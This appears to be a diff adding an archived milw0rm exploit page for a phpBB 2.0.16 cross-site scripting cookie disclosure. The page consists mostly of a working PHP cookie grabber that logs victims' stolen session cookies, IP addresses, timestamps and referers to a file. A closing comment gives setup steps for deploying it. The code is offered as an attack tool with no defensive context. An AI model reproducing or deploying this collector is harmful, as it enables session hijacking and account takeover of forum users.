@@ -1,0 +1,15 @@
+<html><head><title>phpBB <= 2.0.16 XSS Remote Cookie Disclosure Exploit (cookie grabber)</title></head><pre>// Original Author: 'Sjaak Rake' Ref: http://www.hackthissite.org/articles/read/175/
+
+&lt;?php
+$cookie = $_GET['c'];
+$ip = getenv ('REMOTE_ADDR');
+$date=date(&quot;j F, Y, g:i a&quot;);
+$referer=getenv ('HTTP_REFERER');
+$fp = fopen('cookies.txt', 'a');
+fwrite($fp, 'Cookie: '.$cookie.'&lt;br&gt; IP: ' .$ip. '&lt;br&gt; Date and Time: ' .$date. '&lt;br&gt; Referer: '.$referer.'&lt;br&gt;&lt;br&gt;&lt;br&gt;');
+fclose($fp);
+?&gt;
+
+//rename it to cookies.php and create one new file steal.php and chmod it to 777
+
+# milw0rm.com [2005-07-13]</pre></html>
